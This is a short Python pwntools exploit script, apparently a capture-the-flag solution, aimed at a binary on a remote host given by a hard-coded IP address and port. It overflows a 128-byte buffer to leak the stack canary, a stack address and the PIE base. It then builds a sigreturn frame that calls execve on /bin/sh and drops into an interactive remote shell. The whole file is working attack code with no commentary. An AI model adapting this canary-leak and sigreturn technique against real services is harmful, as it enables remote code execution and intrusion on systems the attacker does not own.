from pwn import *

context(log_level = "debug", arch = 'amd64', os = 'linux')

#r = process(['env', '-i', './pwn'])
r = remote('202.198.27.90', 40113)
#r = remote('127.0.0.1', 9999)

r.send(b'a'*(8+128) + b':')
r.recvuntil(b':')
canary = u64(r.recv(7).rjust(8, b'\0'))
rbp = u64(r.recv(6).ljust(8, b'\0')) - 0x38
buf = rbp - 0x90

r.send(b'a'*(8+128) + p64(canary) + p64(0) + b'\x0b')
pause()
r.send(b'a')
pause()

r.send(b'b'*(8*3+128-1) + b':')
r.recvuntil(b':')
pie = u64(r.recv(6).ljust(8, b'\0')) - 0x1130
syscall = pie + 0x102d
sigFrame = SigreturnFrame()
sigFrame.rax = 59
sigFrame.rdi = buf
sigFrame.rsi = 0
sigFrame.rdx = 0
sigFrame.rip = syscall
r.send(b'/bin/sh'.ljust(8+128, b'\0') + p64(canary) + p64(0) + p64(syscall) + bytes(sigFrame))
pause()
#gdb.attach(r)
#pause()
r.send(b'a'*15)

success(hex(canary))
success(hex(rbp))
success(hex(pie))

r.interactive()
